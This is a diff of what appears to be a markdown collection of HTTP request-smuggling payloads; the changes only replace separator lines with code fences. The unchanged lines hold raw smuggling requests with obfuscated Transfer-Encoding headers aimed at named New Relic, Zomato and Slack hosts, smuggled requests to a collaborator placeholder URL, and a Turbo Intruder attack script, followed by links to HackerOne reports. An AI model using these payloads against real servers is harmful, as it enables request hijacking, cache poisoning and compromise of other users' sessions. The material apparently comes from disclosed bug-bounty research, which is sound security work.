@@ -1,3 +1,4 @@
+```
 TPOST /login HTTP/1.1
 Host: staging-login.newrelic.com
 Connection: keep-alive
@@ -21,7 +22,8 @@ X-Forwarded-Host: skeletonscribe.net
 Content-Length: 10
 
 x=
-==============================================================================
+```
+```
 DELETE / HTTP/1.1
 Transfer-Encoding:	chunked
 Host: api.zomato.com
@@ -32,7 +34,8 @@ User-Agent: Treasure/6.7
 
 GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
 X: X
-==============================================================================
+```
+```
 GET / HTTP/1.1
 Transfer-Encoding : chunked
 Host: slackb.com
@@ -43,9 +46,9 @@ Content-Length: 83
 
 GET https://**YOUR_COLLAB_URL**/ HTTP/1.1
 X: X
-==============================================================================
-==============================================================================
-==============================================================================
+```
+Turbo Intruder Code:
+```
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint='https://staging-login.newrelic.com:443',
                            concurrentConnections=5,
@@ -80,11 +83,13 @@ x='''
     engine.queue(attack)
     engine.start()
 
-==============================================================================
+```
 
 Refrences:
+```
 1- https://hackerone.com/reports/726773
 
 2- https://hackerone.com/reports/498052
 
 3- https://hackerone.com/reports/771666
+```
